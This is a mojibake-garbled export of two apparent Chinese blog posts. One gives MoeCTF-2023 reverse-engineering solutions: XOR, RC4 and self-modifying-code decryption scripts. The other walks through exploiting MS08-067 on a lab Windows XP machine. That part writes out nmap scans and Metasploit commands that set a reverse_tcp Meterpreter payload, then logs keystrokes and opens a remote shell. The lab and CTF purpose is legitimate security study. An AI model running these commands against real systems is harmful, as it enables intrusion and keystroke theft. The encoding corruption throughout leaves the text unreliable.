å£³çš„å¯æ‰§è¡Œç¨‹åºæ–‡ä»¶å‹ç¼©å™¨ï¼Œåˆ©ç”¨è¯¥è½¯ä»¶è¿›è¡Œè„±å£³å’ŒåŠ å£³å¤„ç†ï¼Œä»è€Œå¢å¼ºæ–‡ä»¶çš„ä¿å¯†æ€§ã€‚è¿˜å¯ä»¥ä½¿ç”¨è¯¥è½¯ä»¶å‹ç¼©æ–‡ä»¶ï¼Œå‡å°æ–‡ä»¶çš„ä½“ç§¯ã€‚\nå¦‚æœä¸è¿›è¡Œè„±å£³å°±ç›´æ¥æ‹–è¿›IDAï¼Œé‚£ä¹ˆå¯è§å‡½æ•°å°±ä¼šå¾ˆå°‘ï¼Œï¼ˆä¸‹å›¾ä¸æœ¬é¢˜æ— å…³\nè¿™é‡Œé…ä¸ŠUPXè„±å£³å·¥å…·çš„é“¾æ¥ğŸ‘‰ï¼šã€é€†å‘ã€‘UPXå·¥å…·ä½¿ç”¨åŠåŠ å£³_upx.exe_æ±Ÿæ¹–one Catçš„åšå®¢-CSDNåšå®¢\nè„±å£³ä¹‹åï¼Œé€šè¿‡å­—ç¬¦ä¸²ç´¢å¼•åˆ°ä¸»é¡µé¢ğŸ‘‡\nå¯ä»¥çœ‹åˆ°ä¼¼ä¹å°±æ˜¯ä¸ªç®€å•çš„å¼‚æˆ–è§£å¯†\nè¿™æ—¶å¯†æ–‡çš„åå…­è¿›åˆ¶ç¼–ç ğŸ‘‡ï¼Œåªéœ€é€ä½å¼‚æˆ–0x67uï¼ˆä¹Ÿå°±æ˜¯å°å†™å­—æ¯g\nè¿™é‡Œçš„dupï¼Œä¸¾ä¸ªä¾‹å­ï¼š3 dup(\u0026lsquo;F\u0026rsquo;)=\u0026lsquo;F\u0026rsquo; \u0026lsquo;F\u0026rsquo; \u0026lsquo;F\u0026rsquo; ,å°±ç›¸å½“äºæ˜¯å¤šä¸ªç›¸åŒçš„æ•°æ®çš„ç®€å†™å½¢å¼\né…ä¸Šä»£ç ğŸ‘‡\n/*Cè¯­è¨€ä»£ç \rUPX!!\rint main()\r{\rint a[] = { 0x0a,8,2,4,0x13,1,0x1c,\u0026#39;W\u0026#39;,0x0F,\u0026#39;8\u0026#39;,0x1e,\u0026#39;W\u0026#39;,0x12,\u0026#39;8\u0026#39;,\u0026#39;,\u0026#39;,9,\u0026#39;W\u0026#39;,0x10,\u0026#39;8\u0026#39;,\u0026#39;/\u0026#39;,\u0026#39;W\u0026#39;,0x10,\u0026#39;8\u0026#39;,0x13,8,\u0026#39;8\u0026#39;,\u0026#39;5\u0026#39;,2,0x11,\u0026#39;T\u0026#39;,0x15,0x14,2,\u0026#39;8\u0026#39;,\u0026#39;2\u0026#39;,\u0026#39;7\u0026#39;,\u0026#39;?\u0026#39;, \u0026#39;F\u0026#39;,\u0026#39;F\u0026#39;,\u0026#39;F\u0026#39;,0x1a};\rfor (int i = 0; i \u0026lt; 41; i++)\r{\rprintf(\u0026#34;%c\u0026#34;, a[i] ^ \u0026#39;g\u0026#39;);\r}\rreturn 0;\r}\r*/ Xor #\rDESCRIPTION: è¿™é¢˜æ˜¯ä¸€ä¸ªç®€å•çš„å¼‚æˆ–ç®—æ³•ã€‚ç›¸ä¿¡åˆå­¦è€…ä»¬åœ¨ç†Ÿæ‚‰äº†ä¸€äº›ä¾‹å¦‚idaç­‰å·¥å…·çš„ä½¿ç”¨ä¹‹åèƒ½å¾ˆå¿«è§£å†³ã€‚\næç¤ºï¼šå¼‚æˆ–æœ‰ä¸ªç‰¹ç‚¹ï¼Œa ^ b = c ï¼Œé‚£ä¹ˆc ^ a =b\næ“ä½œå’Œä¸Šé¢é‚£ä¸ªUPXæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œåªæ˜¯ä¸ç”¨è„±å£³\nè¿™é‡Œæˆ‘çš„IDAæ·»åŠ çš„Lazyidaæ’ä»¶ä¼¼ä¹åœ¨64ä½idaä¸­æ— æ³•ä½¿ç”¨ï¼Œç‚¹äº†æ²¡æ•ˆæœï¼Œåªèƒ½æ‰‹æŠ„äº†\næœ€å¼€å§‹æˆ‘ç”¨çš„pycharmæ¥è·‘ä»£ç ï¼Œä½†æ˜¯ä¼šè·‘å‡ºæ¥ä¸å¯è§å­—ç¬¦ï¼ŒVisualstudioåˆ™ä¸ä¼šğŸ˜‘\né…ä¸Šä»£ç ğŸ‘‡\nå¼‚æˆ–\rint main()\r{\rint a[] = {0x54,0x56,0x5C,0x5A,0x4D,0x5F,0x42,0x60,0x56,0x4C,0x66,0x52,0x57,0x9,0x4E,0x66,0x51,0x9,0x4E,0x66,0x4D,0x9,0x66,0x61,0x9,0x6B,0x18,0x44};\rchar s[28];\rfor (int i = 0; i \u0026lt; 28; i++)\r{\rs[i] = a[i] ^ \u0026#39;9\u0026#39;;\r}\rprintf(\u0026#34;%s\u0026#34;, s);\rreturn 0;\r} ANDROID #\rDESCRIPTION: ç®€å•çš„androidï¼Œéœ€è¦ä¸€ç‚¹ç‚¹javaåŸºç¡€ã€‚\nçœ‹ä¸æ‡‚Javaä»£ç ä¹Ÿå¯ä»¥é—®é—®AIï¼Ÿ\nå¦‚æœä¸çŸ¥é“ä¸€ä¸ªapkæ–‡ä»¶åº”è¯¥æ€ä¹ˆåˆ†æï¼Œå¯ä»¥è¯•è¯•JADX\njadxè¿™ä¸ªè½¯ä»¶æˆ‘æ‰¾äº†åŠå¤©ä¹Ÿæ²¡æ‰¾åˆ°ï¼Œæœ€åç”¨çš„æ˜¯å¦ä¸€ä¸ªè½¯ä»¶GDA\nç”¨æ³•ä¹Ÿæ˜¯å¾ˆç®€å•çš„ï¼ŒæŠŠapkæ‹–è¿›GDAç„¶åç‚¹å‡»ä¸€ä¸‹Entryå°±èƒ½çœ‹åˆ°ä¸»å‡½æ•°äº†ğŸ‘‡\næºä»£ç ğŸ‘‡\npublic class MainActivity extends AppCompatActivity\t// class@000f44 from classes.dex\r{\rchar[] enc;\rchar[] key;\rpublic void MainActivity(){\rsuper();\rthis.enc = new char[31]{25,7,0,14,27,3,16,\u0026#39;/\u0026#39;,24,2,9,\u0026#39;:\u0026#39;,4,1,\u0026#39;:\u0026#39;,\u0026#39;*\u0026#39;,11,29,6,7,12,9,\u0026#39;0\u0026#39;,\u0026#39;T\u0026#39;,24,\u0026#39;:\u0026#39;,28,21,27,28,16};\rthis.key = new char[9]{\u0026#39;t\u0026#39;,\u0026#39;h\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;m\u0026#39;,\u0026#39;o\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;k\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;y\u0026#39;};\r}\rprotected void onCreate(Bundle p0){\rsuper.onCreate(p0);\rthis.setContentView(R.layout.activity_main);\rthis.findViewById(R.id.check).setOnClickListener(new MainActivity$1(this, this.findViewById(R.id.input)));\r}\r} æœ‰ç”¨çš„ä¿¡æ¯å°±åªæœ‰ enc å’Œ key ä¸¤ä¸ªæ•°ç»„\nenc æ˜¯å¯†æ–‡ï¼Œè€Œ key æ˜¯å¯¹åº”çš„å¯†é’¥\nç®—æ³•æ–¹é¢çš„è¯ï¼Œä¸€çœ¼å¯èƒ½æœ‰ç‚¹è¿·ç³Šï¼Œå…¶å®è¿˜æ˜¯å¼‚æˆ–ğŸ˜…\nåªæ˜¯æŒ‰ç…§ä¸‹æ ‡é¡ºåºå°†keyä¸encè¿›è¡Œå¼‚æˆ–ï¼Œkeyçš„ä¸‹æ ‡è¶…è¿‡æ•°ç»„å¤§å°å°±é‡ç½®ä¸º0\nä»£ç å¦‚ä¸‹ğŸ‘‡ï¼š\n#include \u0026lt;stdio.h\u0026gt;\rchar enc[31] = { 25, 7, 0, 14, 27, 3, 16, \u0026#39;/\u0026#39;, 24, 2, 9, \u0026#39;:\u0026#39;, 4, 1, \u0026#39;:\u0026#39;, \u0026#39;*\u0026#39;, 11, 29, 6, 7, 12, 9, \u0026#39;0\u0026#39;, \u0026#39;T\u0026#39;, 24, \u0026#39;:\u0026#39;, 28, 21, 27, 28, 16 };\rchar key[9] = { \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;k\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;y\u0026#39; };\rvoid decrypt(char* enc, int encLen, char* key, int keyLen) {\rfor (int i = 0; i \u0026lt; encLen; i++) {\renc[i] = enc[i] ^ key[i % keyLen]; // ä½¿ç”¨å¼‚æˆ–è¿ç®—è§£å¯†\r}\r}\rint main() {\rint encLen = sizeof(enc) / sizeof(enc[0]);\rint keyLen = sizeof(key) / sizeof(key[0]);\rdecrypt(enc, encLen, key, keyLen);\rprintf(\u0026#34;Decrypted message: %s\\n\u0026#34;, enc);\rreturn 0;\r} RRRRRc4 #\rDESCRIPTION: ä¸€å¤©dr3æ‰¾åˆ°æµ®å°äº‘ï¼Œè¯´è¦ç»™ä»–çœ‹ä¸ªå¥½ä¸œè¥¿ï¼Œè¯´ç€å°±ç”¨ç¥ç§˜çš„Rc4æŠŠæµ®å°äº‘çè´µçš„flagç»™å¼„å¾—ä¸€å›¢ç³Ÿã€‚ç°åœ¨ï¼Œå”¯æœ‰ä½ èƒ½æ‹¯æ•‘æµ®å°äº‘çš„flagï¼Œå°†æ··ä¹±å˜ä¸ºç§©åºï¼\nä¸»å‡½æ•°æ˜¯è¿™æ ·çš„ğŸ‘‡å…¶ä¸­ä¸€äº›å‡½æ•°åç§°æˆ‘åšäº†è°ƒæ•´\nå…¶ä¸­çš„RC4å‡½æ•°å°±æ˜¯RC4åŠ å¯†å‡½æ•°ï¼Œå…¶ä¸­çš„å˜é‡v7å°±æ˜¯è§£å¯†å¯†é’¥\næŸ¥çœ‹ä¸€ä¸‹secretæ•°ç»„çš„å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°37ä½çš„åå…­è¿›åˆ¶å¯†æ–‡\né‚£ä¹ˆç°åœ¨æœ‰äº†å¯†æ–‡ï¼Œæœ‰äº†å¯†é’¥å¯ä»¥ç›´æ¥å»è§£å¯†äº†\nåŒæ ·æ¥åˆ°CyberchefğŸ‘‡\nSMC #\rDESCRIPTION: smcæ˜¯ä¸€ç§ç¨‹åºåœ¨è¿è¡Œæ—¶ä¿®æ”¹è‡ªèº«çš„æ–¹æ³•\nå»ºè®®äº†è§£ä¸€äº›Cè¯­è¨€åŠé€†å‘åŸºç¡€çŸ¥è¯†å†æ¥å°è¯•\néœ€è¦çš„è¯å¯ä»¥å°è¯•æœç´¢CTF SMCå¹¶å°è¯•ä¾‹é¢˜\nä¸»å‡½æ•°å†…æœ‰ç‚¹ä»·å€¼çš„å°±åªæœ‰è¿™ä¸€ä¸ªäº†\nåœ¨æœç´¢SMCç›¸å…³çŸ¥è¯†åï¼Œåœ¨è¯¥å‡½æ•°å†…å‘ç°ç±»ä¼¼äºsmcçš„ä¸œè¥¿ğŸ‘‡\nå¯ä»¥çœ‹åˆ°å‡½æ•°åœ°å€å¾€å122ä½é€ä½éƒ½è¿›è¡Œäº†å¼‚æˆ–æ“ä½œ\nåœ¨ç¨‹åºæ²¡æœ‰è¿è¡Œçš„æ—¶å€™ï¼Œæ˜¾ç¤ºçš„å‡½æ•°æºç éƒ½æ˜¯ä¹±çš„ğŸ‘‡ï¼Œåªæœ‰å½“ç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œå‡½æ•°æ‰ä¼šè¿˜åŸæˆèƒ½è¢«æ‰§è¡Œçš„æ ·å­\né‚£ä¹ˆæ ¹æ®ä¸Šé¢çš„å¼‚æˆ–åŠ å¯†è¿‡ç¨‹ï¼Œæˆ‘ä»¬è¦å†™ä¸€ä¸ªè„šæœ¬ğŸ‘‡\nimport idc\raddr=0x004014D0\rfor i in range(122):\rb = get_bytes(addr + i, 1)\ridc.patch_byte(addr + i, ord(b) ^ 0x66) ä¿å­˜åœ¨æœ¬åœ°ç„¶åè¿›å…¥IDAï¼Œé€‰æ‹©File-\u0026gt;Script file ç„¶åé€‰æ‹©è¿™ä¸ªè„šæœ¬æ–‡ä»¶\né‚£ä¹ˆç¨‹åºçš„æ•°æ®å°±è¢«æˆ‘ä»¬ä¿®æ”¹äº†\næ‰§è¡Œå®Œæ¯•åä¼šçœ‹åˆ°è¿™æ ·ğŸ‘‡\næ•°æ®æ˜¯æˆåŠŸè¢«ä¿®æ”¹äº†ï¼Œä½†æ˜¯ä¼šå­˜åœ¨ä¸€äº›dbå­¤ç«‹å­—èŠ‚ï¼Œè¿™æ—¶å€™æŠŠå‡½æ•°å†…å­˜åŒºåŸŸå†…çš„dbå…¨éƒ¨é€‰ä¸­æŒ‰Cå¼ºåˆ¶è½¬æ¢ä¸ºæ±‡ç¼–ä»£ç ï¼Œæ¢å¥è¯è¯´ï¼Œæ‰§è¡Œå®Œè„šæœ¬åidaè§£å‡ºæ¥çš„åªæ˜¯ç¢ç‰‡ï¼Œæˆ‘ä»¬è¦è‡ªå·±æ‹¼å›å»\nä¿è¯æ²¡æœ‰å‡½æ•°åŒºåŸŸå†…æ²¡æœ‰dbå­—æ ·åï¼Œé€‰æ‹©èœå•é‡Œçš„Edit-\u0026gt;Functions-\u0026gt;Create Function\nç„¶åå›åˆ°é¡µé¢ç‚¹å‡»é‚£ä¸ªå‡½æ•°ï¼Œå°±èƒ½çœ‹åˆ°å‡½æ•°èƒ½å¤Ÿè¢«æ‰§è¡Œçš„æ ·å­\nï¼ˆè¿™ä¸€æ­¥æ²¡å‡ºæ¥å¯ä»¥åå¤å¤šè¯•å‡ æ¬¡\nåŸºæœ¬é€»è¾‘éƒ½å‡ºæ¥äº†ï¼Œå¯†æ–‡å¼‚æˆ–0x39ç„¶åå‡å»57å°±æ˜¯æ˜æ–‡çš„asciiç \nåé¢çš„å¯†æ–‡ä¹Ÿæ˜¯çœ‹å¾—åˆ°çš„ğŸ‘‡\nç”¨LazyIDAæ’ä»¶å¿«é€Ÿæå–å¯†æ–‡\nä¸‹é¢æ˜¯pythonè§£å¯†ä»£ç ğŸ‘‡ï¼š\nl=[0x9F, 0x91, 0xA7, 0xA5, 0x94, 0xA6, 0x8D, 0xB5, 0xA7, 0x9C, 0xA6, 0xA1, 0xBF, 0x91, 0xA4, 0x53, 0xA6, 0x53, 0xA5, 0xA3, 0x94, 0x9B, 0x91, 0x9E, 0x8F, 0x00, 0x00]\rfor i in l:\rprint(chr((i^0x39)-57),end=\u0026#39;\u0026#39;) ","date":"2023-08-15","externalUrl":null,"permalink":"/posts/2023/08/moectf-2023/","section":"Posts","summary":"","title":"MoeCTF-2023","type":"posts"},{"content":"\rå‰è¨€ #\ræœ¬æ–‡çº¯å±äºâ€œç…§è™ç”»çŒ«â€\nä½“éªŒä¸€ä¸‹ç»å…¸æ¼æ´çš„å¤ç°è¿‡ç¨‹\nå¯¹æµ‹è¯•è¿‡ç¨‹è¿›è¡Œç®€å•çš„äº†è§£\nMS08-067ç®€ä»‹ #\rMS08-067æ¼æ´å…¨ç§°æ˜¯â€œWindows ServeræœåŠ¡RPCè¯·æ±‚ç¼“å†²åŒºæº¢å‡ºæ¼æ´â€ï¼Œæ”»å‡»è€…åˆ©ç”¨å—å®³è€…ä¸»æœºé»˜è®¤å¼€æ”¾çš„SMBæœåŠ¡ç«¯å£445ï¼Œå‘é€ç‰¹æ®ŠRPCï¼ˆRemote Procedure Callï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰è¯·æ±‚ï¼Œé€ æˆæ ˆç¼“å†²åŒºå†…å­˜é”™è¯¯ï¼Œä»è€Œè¢«åˆ©ç”¨å®æ–½è¿œç¨‹ä»£ç æ‰§è¡Œã€‚\nè¿™ä¸ªæ¼æ´å¯ä»¥å½±å“Windows 2000ã€XPã€ server 2023ç­‰ç³»ç»Ÿ\nè¿™é‡Œå°±ç”¨XPè¿™ä¸ªç»å…¸ç³»ç»Ÿæ¥è¿›è¡Œæµ‹è¯•\nç¯å¢ƒæ­å»º #\ræ‰€éœ€ç¯å¢ƒï¼š #\ræ”»å‡»æœºï¼šKali linux 2022\né¶æœºï¼šWindows XP Professional SP3\nè¿™é‡Œæˆ‘çœ‹æœ‰çš„åšå®¢ä¸Šå†™çš„æ˜¯ Windows XP Homeç‰ˆï¼ˆå®¶åº­ç‰ˆï¼‰\nä½†æ˜¯ç»è¿‡æµ‹è¯•ï¼Œä¼¼ä¹å¹¶ä¸èƒ½æˆåŠŸæ‰§è¡Œæ¼æ´ï¼Œäºæ˜¯è¿™é‡Œæˆ‘æ¢äº†ä¸€ä¸ªä¸“ä¸šç‰ˆçš„XP\nåœ¨è¿…é›·é‡Œé¢ä¸‹å¥½ï¼Œç„¶åè£…è¿›VMware workstationé‡Œ\nç½‘ç»œç¯å¢ƒï¼š #\rè¦å°†ä¸¤ä¸ªè™šæ‹Ÿæœºèƒ½å¤Ÿäº’ç›¸è”é€š\nä¹Ÿå°±æ˜¯èƒ½Pingé€š\né¦–å…ˆå°±è¦è®©è™šæ‹Ÿæœºèƒ½å¤Ÿè”ç½‘\næˆ‘æ˜¯æŠŠä¸¤å°æœºå­éƒ½ç”¨æ¡¥æ¥æ¨¡å¼ï¼Œæ¥åˆ°äº†å¤–éƒ¨çš„åŒä¸€ä¸ªWIFIä¸Š\nXPç³»ç»ŸæŸ¥çœ‹è‡ªå·±çš„ipåœ°å€ğŸ‘‡\nç„¶ååœ¨Kalié‡Œé¢æŸ¥çœ‹ipğŸ‘‡\nå¯ä»¥çœ‹åˆ°XPçš„ipæ˜¯ï¼š192.168.101.28\nè€ŒKaliçš„ipæ˜¯ï¼š192.168.101.22\nåªæœ‰æœ€åä¸€æ®µä¸åŒï¼Œè¯´æ˜ä¸¤ä¸ªè™šæ‹Ÿæœºæ˜¯å¤„äºåŒä¸€å±€åŸŸç½‘ä¸‹ï¼ˆåŒä¸€å­ç½‘\nå¯ä»¥è¿›è¡Œäº’ç›¸é€šä¿¡\næ¥ä¸‹æ¥è¯•è¯•ping\nå¯ä»¥çœ‹åˆ°ï¼Œåœ¨XPç³»ç»Ÿä¸­æ˜¯èƒ½å¤Ÿpingé€šKaliçš„\nåœ¨Kaliä¸­æœ‰å¯èƒ½pingä¸é€šXP\nåªéœ€å°†XPçš„é˜²ç«å¢™å’Œè‡ªåŠ¨æ›´æ–°å…³é—­ï¼Œå³å¯\næ‰€éœ€å·¥å…·ï¼š #\rNMAP\nnmapæ˜¯ä¸€æ¬¾éå¸¸å¼ºå¤§çš„ä¸»æœºå‘ç°å’Œç«¯å£æ‰«æå·¥å…·ï¼Œåˆåè¯¸ç¥ä¹‹çœ¼ï¼ˆåå­—æ„Ÿè§‰å°±å¾ˆç‰›\nèƒ½å‘ç°ç›®æ ‡IPæ®µçš„å­˜æ´»ä¸»æœºå’Œå¼€æ”¾çš„ç«¯å£\nä¸€èˆ¬ç”¨æ¥åˆæ­¥æ”¶é›†ä¿¡æ¯\nMetasploit\nMetasploitæ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¼æ´æ£€æµ‹å·¥å…·ï¼Œé™„å¸¦æ•°ç™¾ä¸ªå·²çŸ¥çš„è½¯ä»¶æ¼æ´ï¼Œå¹¶ä¸”æä¾›äº†æ•´åˆçš„åˆ©ç”¨ä»£ç \nè¢«å®‰å…¨ç¤¾åŒºå† ä»¥â€œå¯ä»¥é»‘æ‰æ•´ä¸ªå®‡å®™â€ä¹‹åçš„å¼ºå¤§æ¸—é€æµ‹è¯•æ¡†æ¶\nè¿™ä¸¤ä¸ªå·¥å…·åœ¨Kaliç³»ç»Ÿé‡Œé¢éƒ½è‡ªå¸¦æœ‰ï¼Œæ‰€ä»¥ä¸å¿…å†å»ä¸‹è½½\næµ‹è¯• #\rè¿™é‡Œå°±æ¨¡æ‹Ÿä¸€ä¸‹ä»€ä¹ˆéƒ½ä¸çŸ¥é“çš„æƒ…å†µ\né¦–å…ˆç”¨Nmapæ‰«æç›®æ ‡ç½‘æ®µ\næŸ¥çœ‹å±€åŸŸç½‘å†…å­˜æ´»çš„ä¸»æœº\nnmap -F 192.168.101.0/24 åœ¨Nmapä¸­æœ‰å¤šç§æ¨¡å¼å¯é€‰ï¼Œè¿™é‡Œç”¨ -F æ˜¯å¿«é€Ÿæ‰«æï¼Œå…¶ä½™æœ‰å¾ˆå¤šå¯é€‰é¡¹æ¯”å¦‚è¯´ï¼š-A ï¼ˆaggressive æ”»å‡»æ¨¡å¼\nè¿™é‡Œçš„å…·ä½“å«ä¹‰æ˜¯æ‰«æ 192.168.101.0 åˆ°192.168.101.255 ä¹‹é—´æ‰€æœ‰å­˜æ´»çš„æœºå­ä»¥åŠå¼€æ”¾çš„ç«¯å£\nåœ¨è¿™é‡Œæˆ‘ä»¬æ‰«æåˆ°äº† XPçš„ ip\nä¹Ÿå¯ä»¥å°è¯•ä½¿ç”¨ -O çš„é€‰é¡¹æ¥è·å–å…·ä½“ä¿¡æ¯\nnmap -O 192.168.101.0/24 å¯ä»¥çœ‹åˆ°Nmapå·²ç»è¯†åˆ«åˆ°äº†è¿™ä¸ªæœºå­æ˜¯XPï¼Œè€Œä¸”ç»™å‡ºäº†ä¼°è®¡çš„XPç‰ˆæœ¬æ˜¯sp2æˆ–è€…sp3\nï¼ˆæˆ‘çš„XPæœºå­å°±æ˜¯sp3ç‰ˆæœ¬çš„\nè€Œä¸”æŸ¥çœ‹åˆ°å…¶445ç«¯å£æ˜¯å¤„äºå¼€æ”¾çŠ¶æ€\nèƒ½å¤Ÿå°è¯•åˆ©ç”¨ms08-067æ¼æ´\né¦–å…ˆè¿›å…¥Metasploitçš„å·¥ä½œçŠ¶æ€ï¼Œè¿è¡Œä¸‹é¢çš„å‘½ä»¤ï¼ˆè¦åœ¨rootæƒé™ä¸‹\nmsfconsole ç„¶å\nsearch ms08-067 åœ¨åº“é‡Œé¢æœ‰è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨ä»£ç ï¼Œç¼–å·ä¸º0ï¼Œè¿™é‡Œç”¨ï¼šuse 0 å°±å¯ä»¥äº†\nç„¶åæŸ¥çœ‹æ”»å‡»çš„é€‰é¡¹ï¼Œï¼ˆshow optionsï¼‰çœ‹å“ªäº›æ²¡æœ‰å¡«çš„ï¼Œæˆ‘ä»¬è¦å¡«ä¸Š\nå¯ä»¥çœ‹åˆ°\nRHOSTSï¼ˆå³remote hostsï¼Œæˆ‘ä»¬è¦æ”»å‡»çš„ipï¼‰å’Œexploit targetæ˜¯æ²¡æœ‰é€‰æ‹©çš„\nè¿™é‡Œæˆ‘ä»¬è¦é€‰ä¸Š\nset rhost 192.168.101.28 ç„¶åtargetçš„ç±»å‹è¦è¿›è¡Œé€‰æ‹©ï¼Œè¿™ä¸ªæ˜¯é€‰æ‹©ç›®æ ‡æœºå™¨çš„ç‰ˆæœ¬å·ï¼Œç”¨show targetsæŸ¥çœ‹ç›®å½•\nç¬¬34å·æ˜¯æˆ‘ä»¬ç›®æ ‡æœºå™¨çš„å‹å·ï¼ŒæŠŠtargetè®¾ç½®æˆ34å³å¯\nset target 34 ç„¶åå°±æ˜¯æˆ‘ä»¬è¦è¿›è¡Œæ”»å‡»çš„æ–¹å¼ï¼Œå³payload\nä¸€èˆ¬æ¥è¯´å¸¸è§çš„å°±æ˜¯åè½¬TCPè·å¾—shellæƒé™\nè¿™é‡Œpayloadè¿™æ ·è®¾ç½®ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æŸ¥çœ‹payloadç›®å½•ï¼Œçœ‹å…¶ä»–çš„èƒ½ä¸èƒ½ç”¨\nset payload windows/meterpreter/reverse_tcp è®¾ç½®å®Œååº”è¯¥æ˜¯è¿™æ ·çš„ğŸ‘‡\nç„¶åæˆ‘ä»¬è¾“å…¥ run æˆ–è€… exploit è¿›è¡Œæ”»å‡»\nå¦‚æœå‡ºç°ä¸‹é¢è¿™æ ·ï¼Œé‚£å°±è¯´æ˜æ”»å‡»æˆåŠŸäº†\næ³¨æ„ï¼Œè¿™ä¸ªsessionä¸€å®šè¦æ˜¯opençŠ¶æ€æ‰ç®—æˆåŠŸè·å–shellï¼Œä¸ç„¶å°±åªæ˜¯å®Œæˆäº†ä¸€æ¬¡æ”»å‡»ï¼Œä½†æ˜¯æ”»å‡»æ— æ•ˆ\nä¹‹å‰æˆ‘å°±æ˜¯ç”¨çš„ SP3 Homeç‰ˆçš„XPï¼Œæ­»æ´»éƒ½è”ä¸é€š\nè¿™é‡Œè¦æ³¨æ„çš„æ˜¯\nXPä¸Šçš„é˜²ç«å¢™ã€è‡ªåŠ¨æ›´æ–°è¦å…³é—­\næ‰“å¼€services.mscï¼ˆèµ„æºç®¡ç†å™¨ï¼‰ï¼Œä¿è¯Computer browserã€serverã€workstationè¿™ä¸‰ä¸ªé€‰é¡¹çš„å¯åŠ¨\næ‰“å¼€gpedit.msc(ç»„ç­–ç•¥)ï¼Œå¦‚ä¸‹å›¾è®¾ç½®\nç„¶åå°±æ¥è¯•è¯•æ‹¿åˆ°shellåèƒ½å¹²ä»€ä¹ˆå§\nå…ˆè¾“å…¥ä¸€ä¸ªé—®å·ï¼Ÿ\nmetasploitå·²ç»å°†ä¸€äº›å‘½ä»¤è¿›è¡Œæ•´åˆæ‰“åŒ…ï¼Œå˜æˆé€‰é¡¹äº†\nè¿™é‡Œæœ‰ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„ webcam\né¡¾åæ€ä¹‰ï¼Œèƒ½æ‹¿åˆ°ç”µè„‘å¤–æ¥æ‘„åƒå¤´çš„æƒé™\nå½“ç„¶æˆ‘è¿™ä¸ªè™šæ‹Ÿæœºæ²¡æœ‰æ‘„åƒå¤´\né‚£çœ‹çœ‹å¦å¤–ä¸€ä¸ª\nå…¶ä¸­å¼€å¯ keyscan_start å°±å¯ä»¥ç›‘å¬XPç³»ç»Ÿä¸Šçš„é”®ç›˜\nè¿™é‡Œå®éªŒä¸€ä¸‹\nç”±äºè¦å‚¨å­˜é”®å…¥çš„ä¸œè¥¿ï¼Œæ‰€ä»¥éœ€è¦ä¸€æ®µå†…å­˜ç©ºé—´\næ‰€ä»¥ç”¨ ps å‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹XPé‡Œçš„æ‰€æœ‰è¿›ç¨‹\nè¿™é‡Œæˆ‘ä»¬å°†é”®ç›˜è¾“å…¥çš„ä¸œè¥¿éƒ½å­˜å‚¨åˆ°idä¸º1552è¿™ä¸ªè¿›ç¨‹ï¼Œexplorer.exeç›¸å½“äºæ¡Œé¢\nmigrate 1552 é¦–å…ˆ\nkeyscan_start ç„¶åè¿›å…¥XPæœºï¼Œåˆ›å»ºä¸€ä¸ªè®°äº‹æœ¬å†™ç‚¹ä¸œè¥¿å§\nç„¶åå›åˆ°Kali\nkeyscan_dump å¯ä»¥çœ‹åˆ°ï¼Œåªè¦æ˜¯é”®ç›˜ä¸ŠæŒ‰è¿‡çš„ï¼Œéƒ½èƒ½è¢«è®°å½•ä¸‹æ¥åå¼¹\nå¦‚æœæ˜¯åœ¨ç™»å½•è‡ªå·±çš„è´¦å·æ—¶ï¼Œå°±å¯èƒ½è¢«è®°å½•ä¸‹æ¥\nå½“ç„¶ï¼Œè¿™æ˜¯ä¸€ä¸ªç›¸å½“å¼ºå¤§çš„å·¥å…·ï¼Œèƒ½åˆ©ç”¨çš„è¿œè¿œä¸æ­¢è¿™äº›\næ¯”å¦‚è¯´æˆ‘ä»¬è¾“å…¥shellï¼Œè¿›å…¥windowsçš„å‘½ä»¤è¡Œ\næˆ‘ä»¬åˆ é™¤åˆšåˆšåˆ›å»ºçš„é‚£ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿ï¼Œé‡å‘½åä¸º 1\næ³¨æ„XPé‡Œæœ‰ä¸­æ–‡åœ¨è¿™é‡Œä¼šä¹±ç ï¼Œåº”è¯¥æ˜¯ç¼–ç çš„é—®é¢˜\nåªéœ€è¦è¾“å…¥ chcp 65001 ï¼Œå°±èƒ½å°†å­—ç¬¦é›†æ”¹ä¸ºGBKç®€ä½“ä¸­æ–‡ï¼Œä¸ä¼šä¹±ç äº†\næœ‰äº†shellæƒé™ï¼Œå°±åŸºæœ¬ä¸Šæ‰€æœ‰äº‹éƒ½èƒ½åšğŸ˜€\næ¼æ´æˆå›  #\rè¿™ä¸ªå°±æœ‰ç‚¹è¶…å‡ºèƒ½åŠ›èŒƒå›´äº†\næˆ‘ä¹Ÿè§£é‡Šä¸å¤ªæ¸…æ¥š\nåªèƒ½çœ‹çœ‹å¤§ä½¬çš„æ–‡ç« \nMS08_067æ¼æ´å­¦ä¹ ç ”ç©¶ - ç‡ƒçƒ§å°‘å¹´çš„å¿ƒ - åšå®¢å›­ (cnblogs.com)\nWindowsæ¼æ´ï¼šMS08-067è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°åŠæ·±åº¦é˜²å¾¡ - åä¸ºäº‘å¼€å‘è€…è”ç›Ÿ - åšå®¢å›­ (cnblogs.com)\nMS08-067æ¼æ´åŸç†åŠè¯¦å°½åˆ†æè¿‡ç¨‹ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·\nç»“è¯­ 